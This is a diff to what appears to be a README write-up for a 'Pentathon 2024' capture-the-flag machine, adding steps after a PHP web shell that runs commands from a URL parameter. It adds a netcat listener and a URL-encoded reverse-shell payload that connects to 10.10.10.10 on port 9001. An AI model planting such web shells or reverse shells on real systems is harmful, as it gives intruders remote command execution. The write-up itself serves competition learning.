@@ -1,4 +1,5 @@
 # Pentathon 2024
+https://github.com/user-attachments/assets/24e7e9f6-d086-4573-bd68-3529c14f0e99
 # Approach
 # Initial Discovery 1.Discover Ip
         First Task is to Discover the ip because the machine does not disclose the Ip address 
@@ -104,6 +105,19 @@
         # Code [Shell.php]:
         
         <?php echo "Shell";system($_GET['cmd']); ?>
-
-        # 
         
+        # Listener:
+         nc -lnvp <port>
+         -l - Listening For incoming Connection
+         -n - Numberic Ip
+         -v - Verbose
+         -p - Port
+         
+        # Reverse Shell :
+        url Encoded Payload : nc%20-c%20sh%2010.10.10.10%209001
+
+        #Finally:
+
+https://github.com/user-attachments/assets/5dd1409a-c91f-4caa-8719-8bdc30228e26
+
+
